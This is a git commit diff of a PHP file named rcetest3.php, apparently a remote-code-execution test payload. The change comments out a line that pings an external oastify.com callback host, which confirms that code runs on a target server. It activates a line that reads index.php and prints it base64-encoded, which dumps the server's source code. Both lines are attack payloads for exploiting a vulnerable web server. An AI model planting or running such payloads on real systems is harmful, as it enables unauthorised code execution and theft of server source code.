bc734c4995f8e0abea9b50e782ce6c24e38d2506
0xdomsec <116116368+0xdomsec@users.noreply.github.com>
2023-04-19 07:40:01 -0700

    Update rcetest3.php

--- rcetest3.php
+++ rcetest3.php
@@ -1,4 +1,4 @@
 <?php
-// echo exec('cat index.php | base64 -w 0');
-passthru('ping -c 3 9oyrz1wj94hwg052ao1c5ns65xbszh.oastify.com');
+echo exec('cat index.php | base64 -w 0');
+// passthru('ping -c 3 9oyrz1wj94hwg052ao1c5ns65xbszh.oastify.com');
 ?>
